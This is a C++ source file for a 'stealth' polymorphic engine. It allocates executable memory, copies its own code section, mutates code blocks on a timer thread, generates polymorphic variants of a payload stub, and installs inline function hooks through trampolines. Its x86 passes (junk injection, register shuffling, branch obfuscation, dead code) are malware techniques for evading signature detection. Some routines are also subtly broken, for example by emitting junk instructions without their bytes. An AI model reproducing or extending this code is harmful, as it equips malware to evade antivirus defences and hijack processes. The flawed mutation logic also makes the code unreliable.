#include <diarna/compiler_port.hpp>
#include <diarna/stealth/polymorph.hpp>
#include <diarna/stealth/memory_vault.hpp>

#include <algorithm>

#include <obfuscation/obfusheader.h>
namespace diarna::stealth {

PolymorphicEngine& PolymorphicEngine::instance() {
    static PolymorphicEngine engine;
    return engine;
}

PolymorphicEngine::PolymorphicEngine()
    : rng_(std::random_device{}()),
      gadget_pool_(nullptr), gadget_pool_offset_(0) {}

PolymorphicEngine::~PolymorphicEngine() {
    running_ = false;
    if (monitor_thread_.joinable()) monitor_thread_.join();
    if (gadget_pool_) VirtualFree(gadget_pool_, 0, MEM_RELEASE);
}

void PolymorphicEngine::initialize(uint32_t seed) {
    rng_.seed(seed ? seed : (uint32_t)__rdtsc());
    running_ = true;

    gadget_pool_ = (uint8_t*)VirtualAlloc(nullptr, GADGET_POOL_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (gadget_pool_) {
        for (size_t i = 0; i < GADGET_POOL_SIZE; ++i)
            gadget_pool_[i] = (uint8_t)(0x90 + (i % 7));
        DWORD old;
        VirtualProtect(gadget_pool_, GADGET_POOL_SIZE,
            PAGE_EXECUTE_READ, &old);
    }

    void* engine_copy = metamorphic_alloc(0x4000, true);
    if (engine_copy) {
        HMODULE me = GetModuleHandleW(nullptr);
        MODULEINFO mi;
        GetModuleInformation(GetCurrentProcess(), me, &mi, sizeof(mi));
        auto* dos = (IMAGE_DOS_HEADER*)me;
        auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)me + dos->e_lfanew);
        auto* sections = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (sections[i].Characteristics & IMAGE_SCN_CNT_CODE) {
                size_t copy_sz = sections[i].SizeOfRawData < 0x4000 ? sections[i].SizeOfRawData : 0x4000;
                memcpy((uint8_t*)engine_copy, (uint8_t*)me + sections[i].VirtualAddress, copy_sz);
                break;
            }
        }
    }

    monitor_thread_ = std::thread([this] {
        while (running_) {
            uint32_t jitter = (uint32_t)(rng_() % (mutation_interval_.count() / 2));
            uint32_t base_delay = (uint32_t)(mutation_interval_.count() / 2);
            Sleep(base_delay + jitter);
            if (running_) mutate_all_active();
        }
    });
}

void* PolymorphicEngine::metamorphic_alloc(size_t size, bool executable) {
    INDIRECT_BRANCH;
    DWORD prot = executable ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
    void* mem = VirtualAlloc(nullptr, ((size + 4095) / 4096) * 4096,
        MEM_COMMIT | MEM_RESERVE, prot);
    if (!mem) return nullptr;

    MetamorphicBlock block;
    block.runtime_address = mem;
    block.runtime_size = size;
    block.mutation_counter = 0;
    block.last_mutation_ts = 0;
    block.seed = (uint32_t)rng_();
    block.is_active = true;
    block.original.resize(size);
    block.current.resize(size);
    memset(mem, 0x90, size);

    {
        std::lock_guard lock(blocks_mutex_);
        blocks_[mem] = std::move(block);
    }
    stats_.blocks_active++;
    return mem;
}

bool PolymorphicEngine::metamorphic_free(void* ptr) {
    std::lock_guard lock(blocks_mutex_);
    auto it = blocks_.find(ptr);
    if (it != blocks_.end()) {
        blocks_.erase(it);
        stats_.blocks_active--;
        return VirtualFree(ptr, 0, MEM_RELEASE) != FALSE;
    }
    return false;
}

void PolymorphicEngine::trigger_mutation(void* block_addr) {
    std::lock_guard lock(blocks_mutex_);
    auto it = blocks_.find(block_addr);
    if (it == blocks_.end() || !it->second.is_active) return;

    auto& block = it->second;
    auto& eng = instance();

    uint32_t passes_this_round = (eng.rng_() % 5) + 3;

    memcpy(block.current.data(), block_addr, block.runtime_size);

    for (uint32_t i = 0; i < passes_this_round; ++i) {
        MutationPass::Type t = (MutationPass::Type)(eng.rng_() % MutationPass::COUNT);
        BLOCK_TRUE(eng.apply_mutation_pass(block, t););
    }

    DWORD old;
    VirtualProtect(block_addr, block.runtime_size, PAGE_EXECUTE_READWRITE, &old);
    block.checksum = hash_buffer({block.current.data(), block.current.data() + block.runtime_size});
    memcpy(block_addr, block.current.data(), block.runtime_size);
    VirtualProtect(block_addr, block.runtime_size, old, &old);

    block.mutation_counter++;
    block.last_mutation_ts = GetTickCount64();

    eng.stats_.mutations_performed++;
    eng.stats_.bytes_mutated += (uint64_t)block.runtime_size;
}

void PolymorphicEngine::mutate_all_active() {
    BLOCK_TRUE(
        std::lock_guard lock(blocks_mutex_);
        std::vector<void*> keys;
        for (auto& [ptr, block] : blocks_)
            if (block.is_active && block.mutation_counter < 1000)
                keys.push_back(ptr);

        for (size_t i = 0; i < keys.size(); ++i) {
            if (i > 0) Sleep((DWORD)(rng_() % 50) + 10);
            trigger_mutation(keys[i]);
        }
    );
}

void PolymorphicEngine::apply_mutation_pass(MetamorphicBlock& block,
                                              MutationPass::Type pass) {
    INDIRECT_BRANCH;
    stats_.transforms_applied++;

    switch (pass) {
        case MutationPass::SUB_XOR_TO_SUB_ADD:
            block.current = x86_sub_add(block.current);
            break;
        case MutationPass::PUSH_POP_TO_MOV:
            block.current = x86_push_pop(block.current);
            break;
        case MutationPass::REGISTER_SWAP:
            block.current = x86_register_shuffle(block.current, block.seed + block.mutation_counter);
            break;
        case MutationPass::NOP_SLED_VAR:
        case MutationPass::DEAD_CODE_INJECTION:
            block.current = x86_dead_code(block.current, block.seed ^ block.mutation_counter);
            break;
        case MutationPass::OPCODE_SUBSTITUTION:
            block.current = x86_opcode_substitution(block.current);
            break;
        case MutationPass::BRANCH_OBFUSCATION:
            block.current = x86_branch_obfuscation(block.current);
            break;
        case MutationPass::INSTRUCTION_REORDER:
            block.current = x86_instruction_shuffle(block.current, block.seed);
            break;
        case MutationPass::JMP_JCC_INVERSION: {
            block.current = x86_branch_obfuscation(block.current);
            break;
        }
        case MutationPass::CALL_TO_PUSH_RET:
        case MutationPass::RET_TO_JMP:
        case MutationPass::PREFIX_JUNK:
            block.current = x86_junk_inject(block.current, block.seed * (block.mutation_counter + 1));
            break;
        default:
            break;
    }
}

std::vector<uint8_t> PolymorphicEngine::generate_polymorphic_stub(
    std::span<const uint8_t> payload, uint32_t num_variants) {

    std::vector<std::vector<uint8_t>> variants;
    variants.reserve(num_variants);

    for (uint32_t v = 0; v < num_variants; ++v) {
        std::vector<uint8_t> stub(payload.begin(), payload.end());
        uint32_t seed = (uint32_t)rng_() ^ v;

        stub = x86_dead_code(stub, seed);
        stub = x86_sub_add(stub);
        stub = x86_register_shuffle(stub, seed);
        stub = x86_branch_obfuscation(stub);
        stub = x86_junk_inject(stub, seed ^ 0xDEAD);
        variants.push_back(stub);
    }

    uint32_t idx = rng_() % variants.size();
    return variants[idx];
}

std::vector<uint8_t> PolymorphicEngine::obfuscate_control_flow(
    std::span<const uint8_t> code) {

    auto instructions = disassemble_chunk({code.begin(), code.end()});
    if (instructions.empty()) return {code.begin(), code.end()};

    std::vector<X86Instruction> shuffled = instructions;

    for (size_t i = 1; i < shuffled.size(); ++i) {
        for (auto& instr : shuffled) {
            if (instr.is_branch && instr.branch_target_offset > 0) {
                auto target = (uint64_t)code.data() + instr.branch_target_offset;
                for (size_t j = 0; j < shuffled.size(); ++j) {
                    if (shuffled[j].address == target) {
                        instr.branch_target_offset = (uint32_t)(shuffled[j].address - instr.address);
                        break;
                    }
                }
            }
        }
    }

    return assemble_chunk(shuffled);
}

void* PolymorphicEngine::generate_thunk(void* target) {
    INDIRECT_BRANCH;
    uint8_t thunk_bytes[32] = {
        0xFF, 0x25, 0x02, 0x00, 0x00, 0x00, 0xEB, 0x08,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
    };
    memcpy(thunk_bytes + 8, &target, sizeof(target));

    void* thunk = metamorphic_alloc(32, true);
    if (!thunk) return target;

    memcpy(thunk, thunk_bytes, 32);
    return thunk;
}

void PolymorphicEngine::install_trampoline(void* orig, void* hook,
                                             void** trampoline) {
    INDIRECT_BRANCH;
    uint8_t orig_bytes[16];
    memcpy(orig_bytes, orig, 16);

    auto instructions = disassemble_chunk(
        std::vector<uint8_t>(orig_bytes, orig_bytes + 16));

    size_t stolen_len = 0;
    for (auto& instr : instructions) {
        stolen_len += instr.length;
        if (stolen_len >= 5) break;
    }

    size_t tramp_size = stolen_len + 14;
    void* tramp = metamorphic_alloc(tramp_size, true);
    if (!tramp) return;

    memcpy(tramp, orig, stolen_len);
    uint8_t jmp_back[14] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
    void* back_addr = (uint8_t*)orig + stolen_len;
    memcpy(jmp_back + 6, &back_addr, sizeof(back_addr));
    memcpy((uint8_t*)tramp + stolen_len, jmp_back, 14);

    DWORD old;
    VirtualProtect(orig, stolen_len, PAGE_EXECUTE_READWRITE, &old);
    memset(orig, 0x90, stolen_len);
    uint8_t jmp_hook[14] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
    memcpy(jmp_hook + 6, &hook, sizeof(hook));
    memcpy(orig, jmp_hook, 14);
    VirtualProtect(orig, stolen_len, old, &old);

    *trampoline = tramp;
}

void PolymorphicEngine::set_mutation_interval(std::chrono::milliseconds interval) {
    mutation_interval_ = interval;
}

PolymorphicEngine::Stats PolymorphicEngine::stats() const { return stats_; }

// ====== X86 MUTATION PASSES ======

std::vector<uint8_t> PolymorphicEngine::x86_sub_add(const std::vector<uint8_t>& code) {
    std::vector<uint8_t> mutated = code;
    for (volatile size_t i = 0; i + 2 < mutated.size(); ++i) {
        INDIRECT_BRANCH;
        if (mutated[i] == 0x29) { // SUB r/m, r
            if ((mutated[i+1] & 0xC0) == 0xC0) {
                uint8_t reg = mutated[i+1] & 0x07;
                uint8_t rm = (mutated[i+1] >> 3) & 0x07;
                if (reg == rm) {
                    mutated[i] = 0x31;
                    mutated[i+1] = 0xC0 | (rm << 3) | rm;
                    stats_.transforms_applied++;
                }
            }
        }
    }
    return mutated;
}

std::vector<uint8_t> PolymorphicEngine::x86_reg_swap(const std::vector<uint8_t>& code) {
    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    uint32_t seed = (uint32_t)rng_();
    std::vector<uint8_t> reg_map = {0,1,2,3,4,5,6,7};
    for (int i = 0; i < 3; ++i) {
        uint32_t a = (seed + i * 7) % 8;
        uint32_t b = (seed + i * 13 + 3) % 8;
        if (a >= 4 && b >= 4) std::swap(reg_map[a], reg_map[b]);
    }

    for (auto& instr : instructions) {
        if (instr.modrm >= 0xC0 && !instr.is_branch) {
            uint8_t reg = (instr.modrm >> 3) & 7;
            uint8_t rm = instr.modrm & 7;
            instr.modrm = (instr.modrm & 0xC0) |
                          (reg_map[reg] << 3) | reg_map[rm];
        }
    }

    return assemble_chunk(instructions);
}

std::vector<uint8_t> PolymorphicEngine::x86_junk_inject(
    const std::vector<uint8_t>& code, uint32_t seed) {

    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    static const uint8_t junk_patterns[][3] = {
        {0x90}, {0x90, 0x90}, {0x90, 0x90, 0x90},
        {0x66, 0x90}, {0x0F, 0x1F, 0x00}, {0x0F, 0x1F, 0x40},
        {0x87, 0xC0}, {0x89, 0xC0}, {0x89, 0xDB},
        {0x89, 0xC9}, {0xF7, 0xD0, 0xF7},
    };

    std::vector<X86Instruction> mutated;
    uint32_t junk_counter = 0;

    for (auto& instr : instructions) {
        mutated.push_back(instr);
        junk_counter++;

        if ((junk_counter + seed) % 3 == 0) {
            const auto& junk = junk_patterns[(seed + junk_counter * 7) %
                (sizeof(junk_patterns) / sizeof(junk_patterns[0]))];
            X86Instruction j;
            j.length = 1;
            if (junk[0] == 0x0F) j.length = 3;
            else if (junk[0] == 0x66) j.length = 2;
            if (j.length > 1 && junk[1] == 0x1F) j.length = (seed % 3) + 3;
            j.address = instr.address + instr.length;
            j.is_branch = false;
            mutated.push_back(j);
        }

        if ((junk_counter + seed) % 7 == 0) {
            uint8_t fake_prefix = (uint8_t)(0x40 | (seed + junk_counter) % 8);
            X86Instruction pf;
            pf.length = 1;
            pf.address = 0;
            pf.is_branch = false;
            mutated.insert(mutated.end() - 1, pf);
        }
    }

    return assemble_chunk(mutated);
}

std::vector<uint8_t> PolymorphicEngine::x86_opcode_substitution(
    const std::vector<uint8_t>& code) {

    std::vector<uint8_t> mutated = code;
    for (volatile size_t i = 0; i + 1 < mutated.size(); ++i) {
        uint8_t b = mutated[i];
        if (b == 0x89 && (mutated[i+1] & 0xC0) == 0xC0 &&
            ((mutated[i+1] >> 3) & 7) == (mutated[i+1] & 7))
            continue;
        if (b == 0x50 || (b >= 0x50 && b <= 0x57)) {
            mutated[i] = 0xFF;
            mutated.insert(mutated.begin() + i + 1, (uint8_t)(0x70 | (b - 0x50)));
            i += 2;
        }
    }
    return mutated;
}

std::vector<uint8_t> PolymorphicEngine::x86_branch_obfuscation(
    const std::vector<uint8_t>& code) {

    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    for (auto& instr : instructions) {
        if (instr.opcode == 0xEB || (instr.opcode >= 0x70 && instr.opcode <= 0x7F)
            || instr.opcode == 0xE9 || instr.opcode == 0xE8) {
            instr.is_branch = true;

            if ((instr.opcode >= 0x70 && instr.opcode <= 0x7F) && (rng_() & 1)) {
                instr.opcode ^= 0x01;
            }
        }
        if (instr.opcode == 0xC3 && instr.length == 1 && (rng_() % 4 == 0)) {
            if (instr.address < 0x10000) {
                instr.opcode = 0xEB;
                instr.length = 2;
                instr.imm_size = 1;
                instr.immediate[0] = 0x00;
                instr.branch_target_offset = 2;
            }
        }
    }
    return assemble_chunk(instructions);
}

std::vector<uint8_t> PolymorphicEngine::x86_dead_code(
    const std::vector<uint8_t>& code, uint32_t seed) {

    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    for (auto& instr : instructions) {
        if ((instr.address + seed) % 5 == 0 && !instr.is_branch) {
            auto orig_op = instr.opcode;
            if (orig_op >= 0x50 && orig_op <= 0x57) {
                instr.opcode = (instr.opcode + 1) % 8 + 0x50;
            }
        }
    }

    std::vector<X86Instruction> mutated;
    for (size_t i = 0; i < instructions.size(); ++i) {
        mutated.push_back(instructions[i]);

        if ((i ^ seed) % 3 == 0) {
            for (int d = 0; d < (int)(seed % 4); ++d) {
                X86Instruction j;
                j.length = 1;
                j.address = 0;
                j.is_branch = false;
                mutated.push_back(j);
            }

            uint8_t push_reg = 0x50 | ((seed + i) % 8);
            X86Instruction fake_push, fake_pop;
            fake_push.length = 1;
            fake_push.is_branch = false;
            fake_pop.length = 1;
            fake_pop.is_branch = false;

            mutated.push_back(fake_push);
            mutated.push_back(fake_pop);
        }
    }
    return assemble_chunk(mutated);
}

std::vector<uint8_t> PolymorphicEngine::x86_register_shuffle(
    const std::vector<uint8_t>& code, uint32_t seed) {

    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    uint8_t saved_regs[4] = {
        (uint8_t)((seed >> 0) & 7),
        (uint8_t)((seed >> 3) & 7),
        (uint8_t)((seed >> 6) & 7),
        (uint8_t)((seed >> 9) & 7)
    };

    for (auto& instr : instructions) {
        if (!instr.is_branch && (instr.modrm & 0xC0) == 0xC0) {
            uint8_t reg = (instr.modrm >> 3) & 7;
            uint8_t rm = instr.modrm & 7;

            for (int s = 0; s < 2; ++s) {
                if (reg == saved_regs[s]) {
                    reg = saved_regs[(s + 1 + (seed & 1)) % 2];
                    break;
                }
            }
            if (rm == saved_regs[2]) rm = saved_regs[3];

            instr.modrm = (instr.modrm & 0xC0) | (reg << 3) | rm;
        }
    }
    return assemble_chunk(instructions);
}

std::vector<uint8_t> PolymorphicEngine::x86_push_pop(const std::vector<uint8_t>& code) {
    auto instructions = disassemble_chunk(code);
    if (instructions.empty()) return code;

    std::vector<X86Instruction> mutated;
    bool last_was_push = false;
    size_t push_idx = 0;

    for (size_t i = 0; i < instructions.size(); ++i) {
        auto& instr = instructions[i];
        bool is_push = (instr.opcode >= 0x50 && instr.opcode <= 0x57);

        if (is_push && !last_was_push) {
            last_was_push = true;
            push_idx = mutated.size();
            mutated.push_back(instr);
            X86Instruction nop;
            nop.length = 1;
            nop.address = 0;
            nop.is_branch = false;
            mutated.push_back(nop);
        } else if (instr.opcode >= 0x58 && instr.opcode <= 0x5F && last_was_push) {
            X86Instruction mov;
            mov.opcode = 0x89;
            mov.modrm = 0xC0 | ((instr.opcode & 0x07) << 3) | instructions[push_idx < instructions.size() ? push_idx : i-1].opcode;
            mov.length = 2;
            mov.address = instr.address;
            mov.is_branch = false;
            mutated.push_back(mov);
            last_was_push = false;
        } else if (!is_push) {
            mutated.push_back(instr);
            last_was_push = (is_push);
        }
    }
    return assemble_chunk(mutated);
}

std::vector<uint8_t> PolymorphicEngine::x86_instruction_shuffle(
    const std::vector<uint8_t>& code, uint32_t seed) {

    auto instructions = disassemble_chunk(code);
    if (instructions.size() < 4) return code;

    for (size_t i = 1; i + 1 < instructions.size(); ++i) {
        if ((instructions[i].address + seed) % 5 == 0 &&
            !instructions[i].is_branch && !instructions[i+1].is_branch &&
            !instructions[i-1].is_branch &&
            !instructions[i+1].is_ret && !instructions[i].is_ret) {
            std::swap(instructions[i], instructions[i+1]);
            i++;
        }
    }
    return assemble_chunk(instructions);
}

// ====== X86 DISASSEMBLER ======

std::vector<PolymorphicEngine::X86Instruction>
PolymorphicEngine::disassemble_chunk(const std::vector<uint8_t>& code) {
    std::vector<X86Instruction> result;
    uint64_t addr = 0;
    size_t pos = 0;

    while (pos < code.size()) {
        X86Instruction instr = {};
        instr.address = addr;
        uint8_t b0 = code[pos];

        if (b0 >= 0x40 && b0 <= 0x4F) {
            instr.prefix[instr.prefix_count++] = b0;
            pos++; addr++;
            if (pos >= code.size()) break;
            b0 = code[pos];
        }

        instr.opcode = b0;
        pos++; addr++;

        if (b0 == 0xC3) { instr.length = 1; instr.is_ret = true; }
        else if (b0 == 0xE9) { instr.length = 5; instr.imm_size = 4;
            memcpy(instr.immediate, &code[pos], 4);
            instr.branch_target_offset = *(int32_t*)instr.immediate;
            pos += 4; addr += 4; instr.is_branch = true; }
        else if (b0 == 0xEB) { instr.length = 2; instr.imm_size = 1;
            instr.immediate[0] = code[pos]; pos++; addr++;
            instr.is_branch = true; }
        else if (b0 >= 0x70 && b0 <= 0x7F) { instr.length = 2; instr.imm_size = 1;
            instr.immediate[0] = code[pos]; pos++; addr++;
            instr.is_branch = true; }
        else if (b0 == 0xE8) { instr.length = 5; instr.imm_size = 4;
            memcpy(instr.immediate, &code[pos], 4); pos += 4; addr += 4;
            instr.is_call = true; instr.is_branch = true; }
        else if (b0 >= 0x50 && b0 <= 0x5F) { instr.length = 1;
            instr.modrm = 0xC0 | ((b0 & 0x07) << 3) | (b0 & 0x07); }
        else if (b0 >= 0x58 && b0 <= 0x5F) { instr.length = 1; }
        else if (b0 >= 0x89 && b0 <= 0x8B) {
            if (pos < code.size()) { instr.modrm = code[pos]; pos++; addr++; }
            instr.length = (uint8_t)(2 + (pos > 0 && instr.modrm >= 0x80 ? 4 : 0));
            if (pos + 4 <= code.size() && (instr.modrm & 0xC7) == 0x05) {
                pos += 4; addr += 4;
            }
        } else if (b0 == 0xB8 || (b0 >= 0xB8 && b0 <= 0xBF)) {
            instr.length = (uint8_t)(2 + 4);
            pos += 4; addr += 4;
        } else if (b0 == 0x68) {
            instr.length = 5; pos += 4; addr += 4;
        } else if (b0 == 0xFF) {
            if (pos < code.size()) { instr.modrm = code[pos]; pos++; addr++; }
            instr.length = (uint8_t)(2 + (instr.modrm >= 0x80 ? 4 : 0));
        } else if (b0 == 0x6A) { instr.length = 2; pos++; addr++; }
        else if (b0 == 0x90) { instr.length = 1; }
        else if (b0 == 0xCC) { instr.length = 1; }
        else if (b0 == 0x0F) {
            if (pos < code.size()) {
                uint8_t b1 = code[pos]; pos++; addr++;
                if (b1 >= 0x80 && b1 <= 0x8F) { pos += 4; addr += 4; }
            }
            instr.length = (uint8_t)(addr - instr.address + 1);
        } else if (b0 == 0x31 || b0 == 0x29) {
            if (pos < code.size()) { instr.modrm = code[pos]; pos++; addr++; }
            instr.length = (uint8_t)(addr - instr.address + 1);
        } else {
            if (pos < code.size()) { instr.modrm = code[pos]; pos++; addr++; }
            instr.length = (uint8_t)(addr - instr.address);
        }

        result.push_back(instr);
    }
    return result;
}

std::vector<uint8_t> PolymorphicEngine::assemble_chunk(
    const std::vector<X86Instruction>& instructions) {
    std::vector<uint8_t> output;
    for (auto& instr : instructions) {
        for (uint8_t p = 0; p < instr.prefix_count; ++p)
            output.push_back(instr.prefix[p]);
        output.push_back(instr.opcode);
        if (instr.modrm) output.push_back(instr.modrm);
        for (uint8_t d = 0; d < instr.disp_size; ++d)
            output.push_back(instr.displacement[d]);
        for (uint8_t i = 0; i < instr.imm_size; ++i)
            output.push_back(instr.immediate[i]);
        if (instr.length > output.size()) {
            size_t padding = instr.length - output.size();
            for (size_t p = 0; p < padding; ++p) output.push_back(0x90);
        }
    }
    return output;
}

uint32_t PolymorphicEngine::hash_buffer(std::span<const uint8_t> data) {
    uint32_t h = 0x811C9DC5;
    for (uint8_t b : data) { h ^= b; h *= 0x01000193; }
    return h;
}

CodeMutationGuard::CodeMutationGuard(void* block) : block_(block) {
    auto& eng = PolymorphicEngine::instance();
    std::lock_guard lock(eng.blocks_mutex_);
    auto it = eng.blocks_.find(block);
    if (it != eng.blocks_.end()) {
        was_locked_ = it->second.is_active;
        it->second.is_active = false;
    } else was_locked_ = false;
}

CodeMutationGuard::~CodeMutationGuard() {
    auto& eng = PolymorphicEngine::instance();
    std::lock_guard lock(eng.blocks_mutex_);
    auto it = eng.blocks_.find(block_);
    if (it != eng.blocks_.end()) it->second.is_active = was_locked_;
}

} // namespace diarna::stealth
